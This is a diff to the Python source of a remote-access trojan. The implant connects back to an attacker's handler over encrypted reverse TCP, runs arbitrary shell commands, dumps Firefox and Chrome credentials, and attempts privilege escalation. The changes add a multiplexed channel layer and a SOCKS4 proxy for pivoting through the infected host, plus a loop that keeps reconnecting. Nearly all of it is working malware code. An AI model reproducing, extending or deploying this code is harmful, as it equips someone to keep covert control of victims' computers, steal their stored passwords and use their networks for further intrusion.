@@ -6,7 +6,7 @@ from Crypto.Random import random
 from twisted.internet import reactor
 from twisted.protocols import socks
 import dumpff, traceback
-import hashlib
+import hashlib, Queue
 if os.name =="nt":
 	import dumpchrome, win32net, pupy_privesc, wmi
 
@@ -32,12 +32,84 @@ print HANDLER_PORT
 
 if os.name == "nt":
     c = wmi.WMI()
+	
+global_thread_list = []
 
 def windows_only(func):
 	def tester(*args):
 		if os.name != "nt": return "Command not available on non-windows OS."
 		else: return func(*args)
 	return tester
+	
+class ProxyConnection:
+	def __init__(self, channel):
+		self.channel = channel
+		print "init! channel:"+str(channel)
+		
+	def start(self):
+		print "Starting!"
+		data = self.channel.recv_queue.get()
+		version, type, remote_port, remote_host, user_id = ord(data[0]), ord(data[1]), data[2:4], data[4:8], data[8:-1]
+		if version != 4 or type != 1:
+			print "Request rejected: bad version or type."
+			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
+			return
+			
+		port1, port2 = ord(remote_port[0]), ord(remote_port[1])
+		self.remote_port = int(str(hex(port1)[2:].zfill(2))+str(hex(port2)[2:].zfill(2)), 16)
+		print "remote port: "+str(self.remote_port)
+		self.remote_host = ".".join([str(ord(remote_host[i])) for i in range(4)])
+		
+		self.remote_socket = socket.socket()
+		self.remote_socket.settimeout(20)
+		print "connecting!"
+		self.connect()
+		
+	def send(self, data):
+		self.channel.send_queue.put(self.channel.id+data)
+		
+	def connect(self):
+		try:
+			print "conning to "+str(self.remote_host)+":"+str(self.remote_port)
+			self.remote_socket.connect((self.remote_host, self.remote_port))
+			print "holey moley connectoley"
+			self.remote_socket.settimeout(None)
+		except:
+			self.send("\x00\x5B\x00\x00\x00\x00\x00\x00")
+			return
+
+		self.send("\x00\x5A\x00\x00\x00\x00\x00\x00")
+		self.relay()
+		
+	def reader(self):
+			while True:
+				data = self.remote_socket.recv(8192)
+				if not data:
+					return
+				self.send(data)
+			
+	def writer(self):
+			while True:
+				data = self.channel.recv_queue.get()
+				print self.remote_socket.sendall(data)
+		
+	def relay(self):
+		for f in [self.reader, self.writer]:
+			t = StoppableThread(target=f)
+			t.daemon = True
+			t.start()
+			
+		time.sleep(50)
+	
+class SocksV4Proxy:
+	def __init__(self, send_queue, recv_queue):
+		pass
+	
+class Channel:
+	def __init__(self, id):
+		self.id = chr(id)
+		self.send_queue = Queue.Queue()
+		self.recv_queue = Queue.Queue()
 	
 class Transport:
 	def __init__(self, handler_ip, handler_port):
@@ -91,6 +163,9 @@ class EncryptedReverseTCP(Transport):
 		
 		self.server_public_key = RSA.importKey(base64.b64decode("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDG3CRcM4aUy1FF9swDXMVsYdfH2+l+Z1uXaYs/Y9VP2z7s9VOC+NTmeDAVYyZ2fk0dgzverOIDdj0Dol8cRzT3GMgZ+WESgLKc5dLuvMWTX6zIn1zcrGmkTy3+eh1YKpXbPueRVqlwYl/u6APDIYhoQS9wyf2qYMoyjoOA0YXlCQIDAQAB"))
 		
+		self.main_channel = Channel(1)
+		self.channels = {1:self.main_channel}
+		
 	def gen_diffie_key(self):
 		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
 		base = 2
@@ -128,6 +203,7 @@ class EncryptedReverseTCP(Transport):
 		
 		key, IV = self.gen_diffie_key()
 		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
+		self.secondary_aes_obj = AES.new(key, AES.MODE_CFB, IV)
 		
 		if not self.authenticate(): raise Exception("Server failed to authenticate!")
 		
@@ -137,23 +213,80 @@ class EncryptedReverseTCP(Transport):
 	def decrypt(self, data):
 		return self.aes_obj.decrypt(self.decompress(base64.b64decode(data)))
 		
+	def secondary_encrypt(self, data):
+		return base64.b64encode(self.compress(self.secondary_aes_obj.encrypt(data)))
+		
+	def secondary_decrypt(self, data):
+		return self.secondary_aes_obj.decrypt(self.decompress(base64.b64decode(data)))
+		
 	def compress(self, data):
 		return zlib.compress(data, 9)
 		
 	def decompress(self, data):
 		return zlib.decompress(data)
 		
+	def sender(self):
+		ct = threading.currentThread()
+		waittime = 0.1
+		while not ct.stopped():
+			for channel in self.channels:
+				if not self.channels[channel].send_queue.empty():
+					data = self.channels[channel].send_queue.get()
+					data = self.secondary_encrypt(data)+chr(255)
+					self.comm_socket.sendall(data)
+					waittime = 0.01
+				else:
+					if waittime < 0.2: waittime += 0.01
+					
+			time.sleep(waittime)
+			
+	def receiver(self):
+		ct = threading.currentThread()
+		while not ct.stopped():
+			data = ""
+			while not data.endswith(chr(255)):
+				try: c = self.comm_socket.recv(4096)
+				except:
+					data = self.main_channel.id+"CONN_LOST"+chr(255)
+					break
+				if not c: raise Exception("Handler disconnected")
+				data += c
+				
+			data = self.secondary_decrypt(data[:-1])
+			print data
+			
+			if data.startswith(chr(254)+"CREATE_CHANNEL"):
+				id = int(data.split(":")[1])
+				newchan = Channel(id)
+				self.channels[id] = newchan
+				
+			elif data.startswith(chr(254)+"CREATE_PROXY"):
+				
+				id = int(data.split(":")[1])
+				proxy = ProxyConnection(self.channels[id])
+				t = StoppableThread(target=proxy.start)
+				t.daemon = True
+				t.start()
+				
+			else:
+				identifier, data = data[0], data[1:]
+				self.channels[ord(identifier)].recv_queue.put(data)
+				
+	def start_threads(self):
+		for i in [self.sender, self.receiver]:
+			t = StoppableThread(target=i)
+			t.daemon = True
+			t.start()
+			global_thread_list.append(t)
+
 	def send(self, data):
 		data_package = self.package(data)
 		data_package = self.encrypt(data_package)
-		self.comm_socket.sendall(data_package+chr(255))
+		self.main_channel.send_queue.put(self.main_channel.id+data_package)
 		
 	def recv(self):
-		data = ""
-		while not data.endswith(chr(255)):
-			c = self.comm_socket.recv(4096)
-			if not c: raise Exception("Handler disconnected")
-			data += c
+		data = self.main_channel.recv_queue.get()
+		if data == "CONN_LOST": raise Exception("Handler Disconnected")
 		signature, data = data.split(":")
 		signature = base64.b64decode(signature)
 		data = self.decrypt(data)
@@ -161,9 +294,8 @@ class EncryptedReverseTCP(Transport):
 		return data
 
 class StoppableThread(threading.Thread):
-	def __init__(self, target):
-		super(StoppableThread, self).__init__()
-		self.run = target
+	def __init__(self, target, args=()):
+		super(StoppableThread, self).__init__(target=target, args=args)
 		self._stop = threading.Event()
 		
 	def stop(self):
@@ -505,12 +637,12 @@ class Shell:
 			output = self.tab_complete(arguments)
 		elif command == "crash":
 			raise Exception("As you wish")
-		elif command == "proxy":
-			output = "invalid option"
-			if arguments == "start":
-				output = self.create_tcp_relay()
-			elif arguments == "stop":
-				output = self.stop_tcp_relay()
+		#elif command == "proxy":
+		#	output = "invalid option"
+		#	if arguments == "start":
+		#		output = self.create_tcp_relay()
+		#	elif arguments == "stop":
+		#		output = self.stop_tcp_relay()
 		elif command == "dumpff":
 			output = self.dumpff()
 		elif command == "dumpchrome":
@@ -535,6 +667,9 @@ class Shell:
 			os._exit(0)
 		elif command == "something":
 			output = self.elevate()
+		elif command == "makeproxy":
+			output = "k"
+			ProxyConnection(self.transport.channels[2])
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
@@ -552,11 +687,17 @@ while True:
 	try:
 		shell = Shell(EncryptedReverseTCP(HANDLER_IP, HANDLER_PORT))
 		shell.transport.connect()
+		shell.transport.start_threads()
 		shell.run()
 	except Exception as e:
 		print e
 		shell.transport.comm_socket.close()
 		for t in shell.threads:
 			t.stop()
+		for t in global_thread_list:
+			t.stop()
+		for t in threading.enumerate():
+			try: t.stop()
+			except: pass
 		time.sleep(10)
 		continue
